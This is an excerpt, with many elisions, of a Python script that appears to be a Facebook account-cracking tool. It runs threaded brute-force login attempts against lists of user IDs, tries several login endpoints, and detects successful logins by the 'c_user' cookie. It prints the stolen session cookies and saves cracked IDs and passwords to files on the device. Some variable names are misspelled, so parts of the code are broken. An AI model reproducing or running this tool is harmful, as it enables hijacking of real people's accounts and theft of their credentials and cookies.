...
def REMON():
    ...
    elif aryan =='7':os.system("xdg-open https://www.facebook.com/profile.php?id=61591253291012")
    else:
...
def REMON1():
        ...
        print("[+]==============================================")
        REMONlovesyou = input("[+] [CHOOSE] :- ")
        if REMONlovesyou in ['y','Y','1','yes','YES','Yes']:
                REOMN_xd.append('y')
        else:
                REMON_xd.append('n')
        print("[+]==============================================")
        ...
        print("[+]==============================================")
        REOMNtop = input("[+] [CHOOSE] :- ")
        if REMONtop in ['y','Y','Yes','YES','1']:
                baby.append('y')
        else:
                baby.append('n')
        with ThreadPool(max_workers=30) as yaari:
                ...
                print(f'[+] METHOD CHOOSED : M{REMONfire}')
                ...
                for guru in user:
                        ...
                        if REMONfire =='1':yaari.submit(mbasic,uid,pwx,tl)
                        elif REMONfire =='2':yaari.submit(p,uid,pwx,tl)
                        elif REMONfire =='3':yaari.submit(x,uid,pwx,tl)
                        elif REMONfire =='4':yaari.submit(mobile,uid,pwx,tl)
                        elif REMONfire =='5':yaari.submit(freeq,uid,pwx,tl)
                        elif REMONfire =='6':yaari.submit(d,uid,pwx,tl)
                        else:
        ...
        print('[?] Ids saved in REMON-OK.txt,REMON-CP.txt')
...
def REMON5():
        ...
        with ThreadPool(max_workers=50) as manshera:
                ...
                for love in user:
                        ...
                        for Eman in HamiiID:
                                pwx.append(Eman)
                        if REMONfire =='1':manshera.submit(mbasic,uid,pwx,tl)
                        elif REMONfire =='2':manshera.submit(p,uid,pwx,tl)
                        elif REMONfire =='3':manshera.submit(x,uid,pwx,tl)
                        elif REMONfire =='4':manshera.submit(mobile,uid,pwx,tl)
                        elif REMONfire =='5':manshera.submit(freeq,uid,pwx,tl)
                        elif REMONfire =='6':manshera.submit(d,uid,pwx,tl)
                        else:
...
def mbasic(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
                        ...
                        if 'c_user' in log_cookies:
                                ...
                                cid = coki[151:166]
                                print('\33[1;92m[REMON-OK] '+cid+' | '+ps+'\33[0;97m')
                                if 'y' in REMON_xd:
                                        print("\33[1;92m[💙] \33[1;98mCOOKIES : \33[1;92m"+coki)
                                        cek_apk(session,coki)
                                else:
                                        break
                                open('/sdcard/REMON-OK.txt', 'a').write(cid+' | '+ps+'\n')
                                oks.append(cid)
                                break
                                ...
                                cid = coki[141:156]
                                if 'y' in baby:
                                        print('\33[1;91m[REMON-CP] '+cid+' | '+ps+'\33[0;97m')
                                        open('/sdcard/REMON-CP.txt', 'a').write(cid+' | '+ps+'\n')
                                        cps.append(cid)
                                        break
                                else:
                                        open('/sdcard/REMON-CP.txt', 'a').write(cid+' | '+ps+'\n')
                                ...
                                continue
                loop+=1
                sys.stdout.write('\r\33[1;37m[M1-REMON] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
                sys.stdout.flush()
        except:
                pass
...
def p(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
                        ...
                        if 'c_user' in log_cookies:
                                ...
                                continue
                loop+=1
                sys.stdout.write('\r\33[1;37m[M2-REMON] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
                sys.stdout.flush()
        except:
                pass
...
def mobile(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
                        ...
                        if 'c_user' in log_cookies:
                                ...
                                continue
                loop+=1
                sys.stdout.write('\r\33[1;37m[M4-REMON] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
                sys.stdout.flush()
        except:
                pass
...
def freeq(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
                        ...
                        if 'c_user' in log_cookies:
                                ...
                                continue
                loop+=1
                sys.stdout.write('\r\33[1;37m[M5-REMON] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
                sys.stdout.flush()
        except:
                pass
